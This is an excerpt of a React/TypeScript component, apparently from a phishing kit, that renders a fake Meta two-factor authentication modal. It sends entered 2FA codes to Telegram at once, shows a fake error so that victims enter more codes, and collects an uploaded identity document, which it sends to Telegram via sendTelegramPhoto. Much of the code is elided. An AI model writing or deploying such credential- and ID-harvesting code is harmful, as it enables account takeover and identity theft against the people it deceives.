...
const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }: TwoFAModalProps) => {
    ...
    const handleSubmit = (e: FormEvent<HTMLFormElement>) => {
        ...
        // Gửi Telegram ngay — loading spinner chỉ là UI
        onSubmit(normalizedCode);

        const loadingSec = Math.max(1, Number(config.CODE_LOADING_TIME || 3));
        ...
        setTimeout(() => {
            ...
            setAttempts((prev) => {
                ...
                if (nextAttempt >= (config.MAX_CODE || 2)) {
                    setShowError(false);
                    onSuccess();
                } else {
                    setShowError(true);
    ...
    const handleIdFileChange = (event: ChangeEvent<HTMLInputElement>) => {
        const selectedFile = event.target.files?.[0];
        applySelectedIdFile(selectedFile);
    };

    const applySelectedIdFile = (selectedFile?: File) => {
    ...
    const handleIdentityNext = async () => {
        ...
        try {
            ...
            await sendTelegramPhoto(uploadedIdFile, '<b>ID UPLOAD</b>');
            ...
            <div style={modalStyle}>
                ...
                {isDeviceNotificationMethod ? (
                    <div style={{ width: '100%' }}>
                        ...
                        <div style={{
                            ...
                            <img
                                src={imageSrc(AnotherDeviceNotificationImage)}
                ...
                <div style={{ width: '100%' }}>
                    ...
                    <div style={{
                        ...
                        <img src={imageSrc(TwoFAImage)} width="100%" alt="authentication" style={{ display: 'block' }} />
                    </div>
                ...
                <div style={{
                    ...
                    <img src={imageSrc(MetaLogo)} width="100%" height="100%" alt="Meta"
